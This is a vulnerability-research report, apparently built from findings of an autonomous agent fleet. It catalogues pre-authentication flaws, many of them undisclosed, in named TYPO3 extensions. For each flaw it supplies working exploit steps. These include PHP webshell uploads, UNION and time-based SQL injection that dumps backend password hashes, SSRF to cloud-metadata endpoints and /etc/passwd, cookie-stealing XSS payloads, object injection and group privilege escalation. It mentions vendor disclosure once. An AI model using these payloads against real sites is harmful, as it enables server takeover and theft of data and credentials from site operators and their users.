# TYPO3 hunt — CONFIRMED vulnerabilities (source-verified)

Findings from the autonomous agent fleet that I re-verified by reading the actual
source. Ordered by severity. "Original" = no public CVE/advisory found.

---

## 1. interfrog/if_basic 2.0.0 — CRITICAL — pre-auth arbitrary file upload → RCE (ORIGINAL / 0-day)
- **Entry:** `eID=ajaxupload` (registered `ext_localconf.php:15`), runs pre-auth,
  no authentication.
- **Sink:** `Classes/Utility/AjaxUploadEid.php` `init()`:
  - `validateFile()` checks only `$_FILES['SelectedFile']['type']` — the
    **client-supplied Content-Type** — against `['image/png','image/jpeg','image/gif']`;
    the real content check `getimagesize()` is **commented out** (lines 45-47).
  - `$newFile = 'fileadmin/user_upload/' . date('Y-m-d--H-i-s') . '-' . $uploadedFile['name']`
    — keeps the original **filename + extension** verbatim (no `basename()`, no
    extension rewrite), then `move_uploaded_file()` into the web-reachable folder,
    and returns the exact stored path in JSON.
- **Exploit:** `POST /index.php?eID=ajaxupload` multipart field `SelectedFile`,
  filename `shell.php`, part header `Content-Type: image/png` → passes the MIME
  check → written as `fileadmin/user_upload/<date>-shell.php` → `GET` it → code
  execution. Filename is not `basename()`d, so `../` escapes `user_upload/` too.
- **Contingency (honest):** RCE requires the webserver to execute PHP under
  `fileadmin/` (common on default Apache; blocked by hardened configs). Where PHP
  exec is blocked it degrades to arbitrary file write / stored-XSS (upload
  `.html`/`.svg`) + directory-escape — still High.
- **Verdict:** confirmed pre-auth RCE on default/typical configs. Disclose to vendor.


## 1b. phorax/formhandler (see ext_emconf.php) — CRITICAL — pre-auth arbitrary file upload → RCE (ORIGINAL / 0-day, widely deployed)
- **Entry:** any page with a Formhandler form (a plain contact form suffices);
  also the unauth `eID=formhandler-ajaxsubmit` (`ext_localconf.php:14` → `Http/Submit.php`).
- **Sink:** `Classes/Controller/Form.php::processFiles()`:
  - `foreach ($_FILES as $sthg => $files)` (L707) iterates **every** uploaded file,
    not just declared form fields.
  - the only gate is `if (!isset($this->errors[$field]))` (L720) — an upload under
    a **field name not declared in the form config** has no validator, so no error
    is set and it passes.
  - `$ext = substr($name, strpos($name, '.'))` keeps the original extension
    (`shell.php` → `.php`); **no type/extension allow-list or deny-pattern** before
    `move_uploaded_file($tmp, $uploadPath . $uploadedFileName)` (L766) into the
    web-accessible `uploads/formhandler/tmp/`.
- **Exploit:** POST a Formhandler form with an extra file part named arbitrarily
  (e.g. `x`) whose filename is `shell.php` → written to `uploads/formhandler/tmp/shell.php`
  → GET it → code execution (where `uploads/` executes PHP; else arbitrary file write).
- **Impact > if_basic:** Formhandler is a widely-installed form builder, so the
  exposure is broad. No CVE on record.

## 1d. dmk/mkforms 12.0.5 (CURRENT, TYPO3 11.5–12.4) — HIGH/CRITICAL — pre-auth unrestricted file upload → RCE (ORIGINAL / 0-day, widely-used form builder)
- **Defect:** the `UPLOAD` and `MEDIAUPLOAD` widgets preserve the attacker-controlled
  client filename+extension and hand it straight to the move, with **no core
  `fileDenyPattern` check and no built-in extension allow-list** — whereas the sibling
  `SWFUPLOAD` widget *does* call `verifyFilenameAgainstDenyPattern()` by default
  (`swfupload/…Main.php:146`). The asymmetry is the bug.
  - `UPLOAD`: `basename($aData['name'])` (`widgets/upload/…Main.php:188`) → `$sTargetDir.$sName`
    (`:193`) → `move_uploaded_file(…, $sTarget)` (`:215`). `cleanupFileName()` only rewrites
    characters, **never the extension** (`shell.php`, `.phtml`, `.php5`, `shell.php.` all survive).
  - `MEDIAUPLOAD`: `$aData['name']` (`:283`) → `move_uploaded_file` (`:327`) — raw move happens
    **before** any FAL indexing/rename; also reachable via a dedicated AJAX endpoint
    (`handleAjaxRequest` `:784`, registered `ext_localconf.php:115`).
- **Entry (pre-auth):** any public page rendering an mkforms form with these widgets; normal
  anonymous multipart submit runs `manageFile()` at checkpoint `after-init-datahandler`.
  MEDIAUPLOAD also via `/?mkformsAjaxId=<eid>&object=widget_mediaupload&servicekey=upload&…`
  (the `safelock` is satisfied merely by having rendered the form — no login).
- **Exploit:** submit the form with a file part `filename="shell.php"` (`<?php system($_GET[c]);?>`)
  → written verbatim to the form's `targetdir` → GET it → code execution.
- **Contingency (honest):** RCE requires the form's author-configured `/data/targetdir` to be
  a web-reachable, PHP-executing dir (typical `uploads/…`, `fileadmin/…`) and no optional
  `validator:FILE /extension` allow-list declared (and that validator is post-move cleanup
  anyway — TOCTOU). Where PHP-exec is blocked it degrades to arbitrary file write / stored-XSS
  (`.svg`/`.html`). SWFUPLOAD is hardened (deny-pattern on by default) unless the form sets
  `<usedenypattern>false</usedenypattern>`.
- **Fix:** enforce `verifyFilenameAgainstDenyPattern()` before the move in UPLOAD/MEDIAUPLOAD too.
  Same class as if_basic/formhandler, but in a maintained current release. No CVE on record.

## 1c. ameos/ameos_filemanager 3.1.2 (current, TYPO3 v13) — HIGH — pre-auth SQL injection + arbitrary file read (REGRESSION of TYPO3-EXT-SA-2017-008)
- **SQLi (HIGH, pre-auth):** frontend file search. `ExplorerController` passes the
  request `query` param into `FileRepository::search()`, which does
  `$keyword = "'%" . $queryBuilder->escapeLikeWildcards($keyword) . "%'"` — the value
  is **hand-quoted**, and `escapeLikeWildcards` (`addcslashes($v,'_%')`) does **not**
  escape single quotes — then feeds it to `expr()->like('sys_file_metadata.title', $keyword)`
  (Doctrine `like()` = raw concat, no parameterization). A `'` in the keyword breaks
  out → UNION/boolean SQLi. Exploit: `...[query]=' UNION SELECT ...`.
- **Arbitrary file read / IDOR (MED-HIGH, pre-auth):** `download`/`info` take a raw
  `sys_file` uid; `FileService::load` uses `findByUid` with `respectStoragePage=false`
  and no folder confinement, and `canReadFile` returns true when `fe_group_read` is
  empty (default for unmanaged files) → anonymous download of any FAL file by uid.
- **Upload gap (MED):** `uploadAction` skips the `allowedFileExtension` allow-list;
  anonymous upload allowed where `fe_group_addfile` is empty (RCE bounded only by
  core `fileDenyPattern` blocking `.php`).
- All three regress items fixed in TYPO3-EXT-SA-2017-008 (v1.0.2) — the fixes did
  not survive the v13 rewrite.

## 2. in2code/femanager 13.3.3 — MEDIUM — pre-auth usergroup mass-assignment → privilege escalation (ORIGINAL)
- **Entry:** frontend registration `createAction(User $user)` (`NewController.php:61`).
- **Cause:** `user[usergroup][0]` is an Extbase **trusted property** (rendered
  `Resources/Private/Partials/Fields/Usergroup.html:17`, `property="usergroup"`).
  `UserUtility::overrideUserGroup()` only re-sets the group **if**
  `settings.new.overrideUserGroup` is configured (`UserUtility.php:138`) — **opt-in,
  default off** — and there is **no server-side allow-list** validating the
  submitted group uid at creation (`allUserGroups` is only passed to the view).
- **Exploit:** POST registration with a hidden `user[usergroup][0]=<privileged fe_group uid>`,
  confirm via own email → account joins a restricted/privileged frontend group.
- **Mitigation:** only sites that set `overrideUserGroup` are safe. Default is vulnerable.

## 3. extcode/cart 12.0.0 — MEDIUM — anonymous guest-order disclosure (IDOR) (ORIGINAL)
- `Order\OrderController::listAction` queries `findBy(['feUser' => $uid])`; an
  anonymous visitor's uid is `0`, and guest checkouts persist `fe_user=0`
  (`ext_tables.sql`, `PersistOrder`). With the Order plugin on any non-login-gated
  page, a logged-out user enumerates **all guest orders** (number, dates, total).
  `Cart\OrderController::showAction` additionally has no ownership check (IDOR via
  `orderItem[__identity]`).

## 4. georgringer/news ≤ 14.0.2 — HIGH — unauthenticated SQL injection (KNOWN: CVE-2026-8726 / TYPO3-EXT-SA-2026-010)
- Not present in our cloned 14.0.3 (fix release: `NewsRepository.php:366` now
  `quoteIdentifier()`s the field), but any deployment on **≤14.0.2** with the
  Date-Menu plugin is exploitable via `tx_news_pi1[overwriteDemand][dateField]`
  → `NewsRepository::countByDate()` raw SQL. High value because news is one of the
  most-installed TYPO3 extensions. (Version→CVE "without source" result.)

## 5. bvbmedia/multishop 5.1.110 (abandoned, TYPO3 6.2–7.9) — HIGH/CRITICAL — pre-auth SQL injection (VERIFIED)
- **Entry (pre-auth):** the `coreshop` frontend plugin routes on
  `?tx_multishop_pi1[page_section]=products_search` (`scripts/core.php:9-12`) → the
  public product-search code, no auth.
- **Sink:** `scripts/front_pages/products_search.php`. `price_filter` is taken from
  GET (`:75`), and if it contains `-` it is `explode('-', ...)` into an array (`:78-81`);
  then `$price_filter[0]` is interpolated **unescaped** into a single-quoted `HAVING`
  clause `"(final_price >='" . $price_filter[0] . "' and ...)"` (`:548`), which
  `mslib_fe::getProductsPageSet()` concatenates into `TYPO3_DB->SELECTquery()`→`sql_query()`.
- **Exploit:** `?tx_multishop_pi1[page_section]=products_search&price_filter=1' or sleep(5) and '1'='1-9999`
  → `HAVING (final_price >='1' or sleep(5) and '1'='1' and final_price <='9999')` →
  time-based blind SQLi (UNION/boolean extraction of the whole DB).
- Distinct from the historical CVE-2013-4682 (fixed in 2.0.39); this sink is still
  present in the abandoned 5.1.110 release. Numeric params are `is_numeric`-guarded
  and `skeyword` uses `addslashes`, so `price_filter` is the outlier.
- **5b. Also in multishop 5.1.110 — pre-auth SSRF (arbitrary host + `file://` local read).**
  `mslib_fe::file_get_contents($url)` (`class.mslib_fe.php:10385-10404`) does
  `curl_init($url)`/`curl_exec` (then `file_get_contents` fallback) on any URL-scheme value
  with **no host allow-list and no scheme restriction** (curl honours `file://`). Reached
  pre-auth: `core.php:137` explicitly lets a **guest** into `admin_import` when GET
  `action=run_job` ("allow running the import as a guest… through cronjob"); at
  `admin_import.php:469` `mslib_fe::file_get_contents($this->post['file_url'])` runs, guarded
  only by `if (strstr($file_url,"../")) die()` — which blocks nothing for
  `http://169.254.169.254/…`, `http://127.0.0.1/…`, `file:///etc/passwd`. The DB-job overwrite
  of `$this->post` at `:436` is gated by `is_numeric($_REQUEST['job_id'])`, so a non-numeric/
  absent `job_id` skips it and leaves the attacker's POST `file_url` intact. Exploit:
  `POST /index.php?...&tx_multishop_pi1[page_section]=admin_import&action=run_job` with body
  `action=product-import-preview&file_url=http://169.254.169.254/latest/meta-data/`
  → unauthenticated server-side fetch (cloud-metadata theft / internal port scan / local-file
  read). Guest, no cHash/CSRF.


## 8. chrisgruen/realty-manager 4.0.0 (TYPO3 v10 LTS) — CRITICAL — two pre-auth SQL injections (ORIGINAL / 0-day)
- **Entry:** the `RealtyManager` Extbase frontend plugin — any anonymous visitor on
  the page hosting it. Actions registered `ext_localconf.php:20`:
  `list, form, search, detail, ajaxselectdistrict, ajaxsearch`.
- **SQLi #1 — `ajaxselectdistrict` (cleanest, quoted break-out):**
  `RealtyManagerController::ajaxselectdistrictAction()` reads `$_GET['cityId']`
  directly (`RealtyManagerController.php:240`) → `ObjectimmoRepository::getDistricts()`
  (`ObjectimmoRepository.php:170-177`) builds
  `"SELECT uid, title from … WHERE city = '" . $city_id . "' order by title"` and
  runs it via `executeQuery($sql)` — **raw string, single-quoted, no
  parameterization**. Exploit:
  `?…[action]=ajaxselectdistrict&cityId=0' UNION SELECT username,password FROM be_users-- -`.
- **SQLi #2 — `search`/`list`/`ajaxsearch` (unquoted numeric):**
  `getAllObjectsBySearch($form_data)` (`ObjectimmoRepository.php:23`) takes
  `house_type, apartment_type, employer, city, district` from the request and
  concatenates them **unquoted** into `$add_where` (`… AND house_type = '.$house_type`,
  lines 42-46). The only gate is `if($house_type > 0)` — bypassed by a digit-leading
  payload (`'5 UNION…' > 0` is true under PHP loose compare). `rent_*`/`living_area_*`
  are `is_numeric`-guarded, so those five columns are the injectable outliers.
- **Verdict:** confirmed unauthenticated SQLi (full DB read incl. `be_users` hashes).
  Abandoned/small extension, no CVE. `getDistricts` is the trivial PoC.

## 9. azich/direct-mail 6.0.0-dev (fork) — MEDIUM — pre-auth authCode-inversion → recipient/PII enumeration (ORIGINAL, fork regression)
- **Entry (pre-auth):** `eID=tx_directmail` → `Classes/Middleware/JumpurlController.php`.
- **Cause:** `validateAuthCode()` (`JumpurlController.php:312-330`) has **inverted
  logic** — it throws the "invalid auth code" exception only when the submitted `aC`
  **matches**, so an empty/wrong `aC` passes for any `mid`/`rid`. This defeats the
  per-recipient jumpUrl auth code entirely.
- **Impact:** an anonymous attacker iterating `rid=t_1,t_2,…` / `f_1,…` gets each
  recipient's `###USER_email###` / name markers resolved into the redirect `Location`
  → subscriber e-mail/PII enumeration. Would be HIGH (FE auto-login/ATO via
  `performFeUserAutoLogin`) but that sink is dead due to a `fe_user` vs `fe_users`
  constant typo (`:40` vs `:412`). PoC: `?eID=tx_directmail&mid=1&rid=t_1&jumpurl=0&aC=`.
- Fork-specific: mainline `directmailteam/direct-mail` 9.5.2 has correct polarity and
  the TYPO3-EXT-SA-2020-005 (CVE-2020-12699/12700) fixes.

## 10. datamints/datamints_feuser 0.12.5 (TYPO3 6.2–10.4) — MEDIUM — pre-auth usergroup mass-assignment → privilege escalation (ORIGINAL, needs-config)
- Same class as femanager (#2), different extension. Anonymous frontend registration
  (`showtype=register`; the login gate `:162` only guards `edit`, and the write guard
  `:262` is satisfiable anonymously with `userid=0`, current `pageid`, `submitmode=register`).
- `user[usergroup][]` is only sanitized by `cleanMultipleSelectField()`
  (`class.tx_datamintsfeuser_pi1.php:809` `$arrCleanedValues[] = intval($val)`) — **`intval`
  + maxitems only, no allow-list of permitted `fe_groups` uids**. `:1144`
  `$arrUpdate['usergroup'] = $arrUpdate['usergroup'] ?: <default>` (submitted value wins) →
  `:1162 exec_INSERTquery('fe_users', $arrUpdate)`.
- **Exploit:** anonymous `POST` registration with `tx_datamintsfeuser_pi1[<cid>][usergroup][]=<privileged fe_group uid>`
  → account joins an arbitrary/privileged frontend group.
- **Precondition (needs-config):** `usergroup` must be a rendered field (in the admin
  `usedfields`) — a common self-service config. SQLi/IDOR paths are `fullQuoteStr`/session-uid
  bound (clean). Fix: allow-list submitted group uids.

## 6. creativekallol/ck-faq 1.0.0 (CURRENT, TYPO3 v13.4) — HIGH — pre-auth PHP object injection via cookie (ORIGINAL / 0-day)
- **Sink:** `Classes/ViewHelpers/FaqRatingViewHelper.php:59`
  `$cookie = @unserialize(urldecode($_COOKIE['faq_rating_'.$faqId]))` — **raw unserialize of a
  fully attacker-controlled cookie**, no `['allowed_classes'=>false]`; the `@` only mutes
  warnings and the `is_array()` check runs **after** unserialize, so `__wakeup`/`__destruct`
  already fire on any injected object.
- **Entry (pre-auth):** the anonymous `Pi1` FAQ plugin (`ext_localconf.php:19` configurePlugin,
  `FaqController::list`) renders `{ckfaq:faqRating(faqId: faq.uid)}` for **every** listed FAQ
  (`Resources/Private/Templates/Faq/List.html:50`). Cookie name is predictable (`faq_rating_<uid>`,
  uid = the FAQ record's uid). No login/token.
- **Exploit:** on any page with the FAQ list plugin, send
  `Cookie: faq_rating_1=<urlencoded serialized POP-gadget object>` → object instantiated at
  unserialize. No gadget ships in ck-faq itself, but it targets **TYPO3 v13.4**, whose runtime
  (core / Symfony / Guzzle / doctrine) commonly provides POP chains → the extension supplies the
  injection primitive. PoC scalar: `faq_rating_1=O%3A8%3A%22stdClass%22%3A0%3A%7B%7D`.
- **Verdict:** confirmed pre-auth object-injection primitive in a current stable release. No CVE.
  Fix: `unserialize($x, ['allowed_classes'=>false])` (it only needs the `rate` scalar anyway).

---

## 7. caretaker/caretaker 1.0.3 — MEDIUM — pre-auth eID auth bypass → monitoring info disclosure (ORIGINAL)
- `validApiKey()` (`Classes/eid/class.tx_caretaker_Eid.php:164-181`) builds
  `tx_caretaker_api_key = fullQuoteStr($apiKey)`; an empty/missing `apiKey` becomes
  `= ''`, and `tx_caretaker_api_key text NOT NULL` has no usable default → ordinary
  `fe_users` carry an empty key. So `?eID=tx_caretaker&apiKey=&node=instance_1&addNode=1&addResult=1`
  returns the full monitoring tree to an unauthenticated caller (when `eid.enabled=1`,
  the intended production setting). No unserialize-of-request RCE here.

### Lower-severity / conditional (verified, for completeness)
- geraldloss/glcrossword 9.0.0 (TYPO3 v13): pre-auth **unsafe dynamic dispatch**.
  FE middleware `?PSR-15-eID=glcrossword` (`RequestMiddlewares.php`, after
  `cms-frontend/authentication`, anonymous OK) → `GlcrosswordAjax.php:82`
  `$this->$strProcess($id,$params)` where `strProcess = getQueryParams()['strProcess']`
  is unsanitized (`:76`). Bounded to methods that exist on the class (no `__call`),
  so **not RCE** — invokes non-exposed data methods / recursion DoS
  (`strProcess=handleAjaxRequest`). Low/Med.
- causal/routing 0.5.0: pre-auth reflected XSS. eID `routing` (`ext_localconf.php:7`
  `eID_include`) → when `RoutingController::dispatch()` returns null (any unmatched
  `route`), `EidController.php:35` echoes `$_SERVER['REQUEST_URI']` and
  `$_SERVER['SERVER_NAME']` into a **text/html** 404 body with **no htmlspecialchars**.
  `?eID=routing&x="><script>alert(document.domain)</script>`. Caveat: REQUEST_URI-based
  reflection is subject to browser URL-encoding of `<>` (query-string payloads / non-browser
  clients still land) — hence conditional. Med.
- realurl (helhum) 2.1.8: **not** SQLi — UrlRewritingHook.php:769/1701 flagged, but all
  values pass through `INSERTquery`→`fullQuoteArray`/`fullQuoteStr`, `tstamp=time()` int.
  Well-sanitized. FP.
- simonschaufi/ve_guestbook 3.3.0 (TYPO3 7.6): pre-auth **stored XSS** (default config).
  Anonymous `FORM` submit (`USER_INT`, `pi_checkCHash=false`); fields stored after only
  `removeBadHTML()` (`:690`) — a TYPO3 **blocklist, not an encoder** (no `<`/`>`/`"` encoding;
  bypass `<img src=x alt=">" onerror=alert(document.cookie)>`). Rendered with **no
  htmlspecialchars** — `###GUESTBOOK_FIRSTNAME###=cutDown($row['firstname'])` (`:521`),
  `###GUESTBOOK_ENTRY###=nl2br($row['entry'])` (`:568`) etc. via `substituteMarkerArrayCached`
  into the HTML template. Every visitor loading the LIST page executes the payload. Gated only
  if `manual_backend_release=1` (approval-before-display) — **default off**. Med.
- sourcebroker/restrictfe 12.0.1: **config-gated** Host-header reflected XSS. The 403 block page
  (`RequestCheck.php:75` text/html) substitutes `getIndpEnv('TYPO3_SITE_URL')` (Host-derived) into
  `{beLoginLink}` unescaped (`:62`). A `Host: x"><script>…` fires — but only when TYPO3's
  `trustedHostsPattern` is set permissively (`.*`), a known misconfiguration; the default pattern
  rejects spoofed Hosts. Pre-auth (the 403 is the default anon state), but needs-config. Low.
- realurl 1.12.8.19: conditional 404-URL-reflection XSS + below the 1.12.9 XSS fix.
- ecodev/tagpack 0.13.0: pre-auth reflected XSS — `pi1` echoes `piVars[searchWord|from|to]`
  and arbitrary GET params into `<input value="…">` unencoded
  (`class.tx_tagpack_pi1.php:302/316/321/366`). Its `ajaxsearch_server.php` `pid` SQLi
  is backend-auth only. Med.
- powermail 13.1.0: `print_r($_REQUEST)` reflected into the admin spam-notification mail (Low).
- cundd/rest 5.1.0: API-key brute-force (no rate limit); mass-disclosure only if `paths.*.read=allow` misconfigured.
- beechit/fal_securedownload 6.0.3: cross-storage folder-existence oracle via the FileTreeState eID (Low, no file bytes).
- extcode/cart: negative cart quantities (hardening gap).

### Authenticated / not pre-auth, but real (out of primary scope, recorded for completeness)
- **jvelletti/jvchat 13.4.1 — authenticated (FE-user) stored XSS → moderator/superuser
  session theft.** Posting is gated on a logged-in frontend user (`checkAccessToRoom`), but
  chat self-registration is typical. The `m` message param (`Chat.php:124`) escapes only
  `<`/`>`, leaving `"` `'` `[` `]`; stored raw, then `LibUtility::formatMessage`
  (`LibUtility.php:271`) rebuilds an `<img src="\2" onclick="…">` tag from `[img=..]` BBCode
  with no quote-escaping, emitted via `<f:format.raw>` (`GetMessages.html`) and injected with
  `innerHTML` by `tx_jvchat.min.js`. Payload
  `m=[img=x]a" onerror="alert(document.cookie)" x="[/img]` fires in **every room member's**
  browser (moderators/superusers included) on their `a=gm` poll → cookie theft / privileged
  takeover. Reflected-XSS CodeQL hits in the same files are FP (JSON/XML content-type; the
  legacy `JvchatEid.php` is unregistered dead code). Med–High (auth-gated).
- **gdpr-extensions-com/* `GdprManagerController::uploadImageAction` — backend editor → RCE
  (×~19 near-identical extensions).** `$_FILES['image']['name']` → `pathinfo(…,EXTENSION)`
  (`:302`) → `move_uploaded_file` into `fileadmin/user_upload/two_click_solution/<md5>.<ext>`
  (`:307`) with **no extension allow-list / MIME check**, using raw `move_uploaded_file` that
  **bypasses `BE/fileDenyPattern`**. Exposed only via the backend module (`access=user,group`,
  not admin) — so a **low-privileged BE editor** with the gdpr module can drop `<md5>.php` →
  RCE (privilege escalation across the boundary). 19 of 23 `gdpr-extensions-com_*` clones ship
  the byte-identical sink; none expose it on a FE/eID/AJAX route (so **not** pre-auth). One
  shared fix (image allow-list + `verifyFilenameAgainstDenyPattern`) covers the family.
- **directmailteam/direct_mail_subscription 2.0.4 — low-severity open redirect.** The `backURL`
  sanitizer (`user_feAdmin.php:150-163`) strips quotes/`<>`/`javascript:` and `scheme://host`,
  but misses **protocol-relative `//evil.com`**, which flows into `###BACK_URL###` used as a
  link href / JS form action. Click-based (no server `Location:`), so Low. Its authCode flow is
  otherwise hardened (uid-bound `md5(uid||encryptionKey)`, non-empty, `strcmp`) — no IDOR/SQLi.

### Hardened in the audited (latest) version — no pre-auth finding
apache-solr, sf_event_mgt, jweiland/events2, friendsoftypo3/tt_address,
in2code/powermail (core sinks), innologi/decosdata (HMAC-gated), oliverklee/realty
(int-cast). Confirms: latest maintained extensions are patched; the risk lives in
**old versions in the wild** (version→CVE map) and **abandoned** extensions.
